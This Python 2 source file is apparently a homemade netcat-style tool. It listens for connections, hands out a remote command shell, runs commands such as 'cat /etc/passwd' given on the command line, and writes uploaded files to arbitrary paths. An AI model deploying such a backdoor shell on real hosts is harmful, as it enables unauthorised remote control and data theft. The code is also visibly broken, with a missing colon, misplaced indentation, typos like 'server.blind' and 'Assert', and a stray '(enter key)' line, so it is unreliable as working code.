import sys
import socket
import getopt
import threading
import subprocess

#Definition of global variables
    listen = False
    command = False
    execute = ""
    target = ""
    upload_destination = ""
    port = 0

#Main purpose is to teach how to use this cool thingy. You can alwasy use whatever port
def usage():
    print "By n0t_4kum4\n"
    print "How to use me: ThisCoolScript.py -t [target_host] -p [port]"
    print "-l --listen listen on [host]:[port] for incomming connections"
    print "-e --execute=[file_to_run] -execute the given file upon connection received"
    print "-c --command initialize a command shell"
    print "-u --upload=[destination] -upon receiving connection upload a file and write to [destination]"
    print "\n \n"
    print "Example: \nThisCoolScript.py -t 192.168.0.1 -p 1337 -l -c"
    print "ThisCoolScript.py -t 192.168.0.1 -p 1337 -l -u=c:\\target.exe"
    print "ThisCoolScript.py 192.168.0.1 -p 1337 -l -e=\"cat /etc/passwd\""
    print "echo '1337H4X0R' | ./ThisCoolScript.py -t 192.168.11.12 -p 1337"
    sys.exit(0)

#Definition of main. Obs!
def main()
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
                                                                                                                                                                                                                                                                                                  
    if not len(sys.argv[1:]):usage()                                                                                                                                                                                                                                                              
    try: opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu", ["help","listen","execute","target","port","command","upload"])                                                                                                                                                                    
    except getopt.GetoptError as err:                                                                                                                                                                                                                                                             
        print str(err)                                                                                                                                                                                                                                                                            
        usage()                                                                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                                                                                  
        for o,a in opts:                                                                                                                                                                                                                                                                          
            if o in ("-h","--help"):                                                                                                                                                                                                                                                              
                usage()                                                                                                                                                                                                                                                                           
            elif o in ("-l","--listen"):                                                                                                                                                                                                                                                          
                listen = True                                                                                                                                                                                                                                                                     
            elif o in ("-e", "--execute"):                                                                                                                                                                                                                                                        
                execute = a                                                                                                                                                                                                                                                                       
            elif o in ("-c", "--commandshell"):                                                                                                                                                                                                                                                   
                command = True                                                                                                                                                                                                                                                                    
            elif o in ("-u", "--upload"):                                                                                                                                                                                                                                                         
                upload_destination = a                                                                                                                                                                                                                                                            
            elif o in ("-t", "--target"):                                                                                                                                                                                                                                                         
                target = a                                                                                                                                                                                                                                                                        
            elif o in ("-p", "--port"):                                                                                                                                                                                                                                                           
                port = int(a)                                                                                                                                                                                                                                                                     
            else:                                                                                                                                                                                                                                                                                 
                Assert False, "Not an option pal."                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                                  
        if not listen and len(target) and port > 0:                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                                  
            #read in the buffer from cli                                                                                                                                                                                                                                                          
            #if no input, CTRL-D                                                                                                                                                                                                                                                                  
            buffer = sys.stdin.read()                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                                                                  
            #sending data off                                                                                                                                                                                                                                                                     
            client_sender(buffer)                                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                                                                  
            #Listen and upload things, execute commands, and, drop shell back
            if listen:
                server_loop()

main()

def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #Connection to target host
        client.connect((target,port))

        if len(buffer):
            client.send(buffer)

        while true:
            #waiting for the data to come back
            recv_len = 1
            response = ""

            while recv_len:

                data = client.recv(4096)
                recv_len = len(data)
                response+= data

                if recv_len < 4096:
                    break
            
            print response,

            #waiting for more input
            buffer = raw_input
            buffer = raw_input("")
            buffer += "\n"

            #Sending it off
            client.send(buffer)

    except:

        print "[*] Exception! Exitting."

        #Tearing down of the connection
        client.close()

def server_loop():
    global target

    # if no target is defined, we listen all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.blind((target,port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        #spin off a thread to handle the new client
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()

def run_command(command):

    #New line trimming
    command = command.rstrip()

    # run the command and spit the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)

    except:
        output = "Execution of the command failed. \r\n"

    #Sending the output back to the client
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    # Check for upload
    if len(upload_destination):

        #Read in all the bytes and write it out to the destination
        file_buffer = ""

        #Keep reading data until none is available
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        try: 
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #Acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to the %s\r\n" % upload_destination)

        except:
            client.socket.send("Failed to save the file to %s\r\n" % upload_destination)

    #Checking command execution
    if len(execute):

        #run the command
        output = run_command(execute)

        client_socket.send(output)

    #Another loop if a shell was requested
    if command:

        while True:
            # Simple prompt
            client_socket.send("<4KUM4:#> ")

                (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:

                cmd_buffer += client_socket.recv(1024)
            
            #Sending back the command output
            response = run_command(cmd_buffer)
            
            #Sending back the response
            client_socket.send(response)
